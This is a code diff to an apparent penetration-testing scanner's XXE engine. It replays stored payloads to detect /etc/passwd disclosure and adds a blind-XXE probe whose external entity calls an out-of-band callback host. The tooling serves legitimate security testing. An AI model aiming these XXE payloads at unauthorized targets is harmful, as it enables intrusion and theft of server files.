@@ -130,39 +130,103 @@ fn file_disclosed(body: &str, canaries: &[&str], path_marker: &str) -> bool {
 
 pub async fn run_xxe_result_ctx(target: &str, ctx: &EngineRunContext) -> EngineResult {
     let mut result = run_xxe_result(target).await;
-    if ctx.memory_payloads.is_empty() || target.trim().is_empty() {
+    if target.trim().is_empty() {
         return result;
     }
-    let client = http_client().await;
-    let base = normalize_url(target);
-    for path in XML_PATHS {
-        let url = format!("{}{}", base.trim_end_matches('/'), path);
-        for payload in &ctx.memory_payloads {
-            if payload.trim().is_empty() {
-                continue;
-            }
-            if let Some(p) = http_post_body(&client, &url, "application/xml", payload).await {
-                if file_disclosed(&p.body, PASSWD_CANARIES, "/etc/passwd")
-                    || file_disclosed(&p.body, HOSTNAME_CANARIES, "/etc/hostname")
-                {
-                    result.findings.push(xxe_finding(
-                        "XXE confirmed via attacker-memory payload replay",
-                        "critical",
-                        &format!(
-                            "Memory-replayed payload on {} disclosed file content (HTTP {}).",
-                            url, p.status
-                        ),
-                        target,
-                        json!({ "path": path, "attacker_memory": true }),
-                    ));
-                    if let Some(id) = ctx.memory_path_ids.first() {
-                        if let (Some(pool), Some(tid)) = (ctx.app_pool.as_ref(), ctx.tenant_id) {
-                            pentest_memory::record_replay_hit(pool.as_ref(), tid, *id).await;
+    if !ctx.memory_payloads.is_empty() {
+        let client = http_client().await;
+        let base = normalize_url(target);
+        for path in XML_PATHS {
+            let url = format!("{}{}", base.trim_end_matches('/'), path);
+            for payload in &ctx.memory_payloads {
+                if payload.trim().is_empty() {
+                    continue;
+                }
+                if let Some(p) = http_post_body(&client, &url, "application/xml", payload).await {
+                    if file_disclosed(&p.body, PASSWD_CANARIES, "/etc/passwd")
+                        || file_disclosed(&p.body, HOSTNAME_CANARIES, "/etc/hostname")
+                    {
+                        result.findings.push(xxe_finding(
+                            "XXE confirmed via attacker-memory payload replay",
+                            "critical",
+                            &format!(
+                                "Memory-replayed payload on {} disclosed file content (HTTP {}).",
+                                url, p.status
+                            ),
+                            target,
+                            json!({ "path": path, "attacker_memory": true }),
+                        ));
+                        if let Some(id) = ctx.memory_path_ids.first() {
+                            if let (Some(pool), Some(tid)) = (ctx.app_pool.as_ref(), ctx.tenant_id)
+                            {
+                                pentest_memory::record_replay_hit(pool.as_ref(), tid, *id).await;
+                            }
                         }
                     }
                 }
             }
         }
+    }
+    if crate::fuzz_oob::oast_correlation_enabled() && !target.trim().is_empty() {
+        let token = uuid::Uuid::new_v4().simple().to_string();
+        if let Some(embed) = crate::fuzz_oob::oast_embed_url_for_token(&token) {
+            let host_part = embed
+                .trim_start_matches("http://")
+                .trim_start_matches("https://")
+                .split('/')
+                .next()
+                .unwrap_or(embed.as_str());
+            let payload = format!(
+                r#"<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "http://{host_part}/">]><r>&xxe;</r>"#
+            );
+            let client = http_client().await;
+            let base = normalize_url(target);
+            let mut planted = false;
+            for path in XML_PATHS.iter().take(8) {
+                let url = format!("{}{}", base.trim_end_matches('/'), path);
+                if http_post_body(&client, &url, "application/xml", &payload)
+                    .await
+                    .is_some()
+                {
+                    planted = true;
+                }
+            }
+            if planted {
+                let confirmed =
+                    crate::fuzz_oob::poll_oob_token_confirmed(&client, &token, 4, 2500).await;
+                if confirmed {
+                    result.findings.push(xxe_finding(
+                        "Blind XXE confirmed via live OAST callback",
+                        "critical",
+                        "The XML parser fetched the Weissman OAST listener. Blind XXE is proven — not inferred from a planted entity.",
+                        target,
+                        json!({ "vector": "oast_callback", "oast_token": token }),
+                    ));
+                } else {
+                    result.findings.push(xxe_finding(
+                        "Blind XXE OAST probe planted — no live callback (not proven)",
+                        "info",
+                        "An external entity pointing at the tenant OAST host was submitted. Without a real DNS/HTTP callback this is not proof-grade blind XXE.",
+                        target,
+                        json!({ "vector": "oast_planted", "oast_token": token }),
+                    ));
+                }
+            }
+        }
+    } else if !crate::fuzz_oob::oast_correlation_enabled()
+        && result.findings.iter().any(|f| {
+            f.get("title")
+                .and_then(|t| t.as_str())
+                .is_some_and(|t| t.contains("differential"))
+        })
+    {
+        result.findings.push(xxe_finding(
+            "Blind XXE not proven — OAST listener is not configured",
+            "info",
+            "In-band differential response is a candidate only. Set WEISSMAN_OAST_DOMAIN and WEISSMAN_OAST_LISTENER_URL (or tenant oast_domain) for callback proof.",
+            target,
+            json!({ "vector": "oast_unconfigured" }),
+        ));
     }
     if !result.findings.is_empty() {
         result.message = format!(
